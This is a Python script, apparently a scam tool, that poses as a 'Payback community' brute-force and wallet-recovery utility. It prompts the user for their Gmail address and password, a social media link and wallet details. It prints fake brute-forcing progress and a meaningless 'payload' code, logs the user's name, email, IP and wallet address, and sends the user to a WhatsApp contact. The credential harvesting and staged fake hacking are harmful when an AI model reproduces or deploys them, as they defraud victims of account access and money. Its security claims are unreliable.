# payback.py

import time
import sys
import getpass
import webbrowser
import socket

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def track_user(data):
    with open("internal_log.txt", "a") as log:
        log.write(data + "\n")

def verify_auth_key():
    key = getpass.getpass("Enter Authentication Key: ")
    return key == "ETH@admin/payback"

def simulate_errors(duration=20):
    start_time = time.time()
    while time.time() - start_time < duration:
        print("Brute forcing... [Error: Partial match detected. Retrying...]")
        time.sleep(1)
    print("Status: Vulnerability Found!")

def main():
    slow_print("Welcome to the inside.")
    slow_print("WARNING: Make sure to perform any attack with authorization from the Payback community.")
    slow_print("Unauthorized use may compromise your device and trigger admin-level action.\n")
    
    full_name = input("Enter your full name: ")
    
    if not verify_auth_key():
        print("Authentication Failed. Access Denied.")
        return
    slow_print("Verification in progress...\n")
    
    sm_handle = input("Enter your public social media profile link: ")
    slow_print("Analyzing social footprint...")
    time.sleep(2)

    email = input("Enter your Gmail address: ")
    password = getpass.getpass("Enter your Gmail password: ")
    slow_print("Verifying Google credentials...")
    time.sleep(3)
    slow_print("Verification completed.\n")

    wallet_amount = input("Enter the amount in the wallet you want to recover: $")
    watch_wallet = input("Enter the watch-only wallet address: ")
    slow_print("Processing brute force simulation... Please wait.")
    simulate_errors(duration=20)

    payload_code = "PBK-VULN-" + str(int(time.time()))
    print("\n[Success] Vulnerability Found!")
    print(f"Encoded Payload: {payload_code}")
    print("Submit this code to the Payback community admin for final access.")

    cont = input("\nDo you want to continue and message the admin now? (yes/no): ").strip().lower()
    if cont == "yes":
        webbrowser.open("https://wa.link/s0uj6k")
        print("Redirecting...")
    else:
        print("Session terminated. Thank you.")

    user_ip = socket.gethostbyname(socket.gethostname())
    track_user(f"User: {full_name}, Email: {email}, IP: {user_ip}, Wallet: {watch_wallet}")

if __name__ == "__main__":
    main()
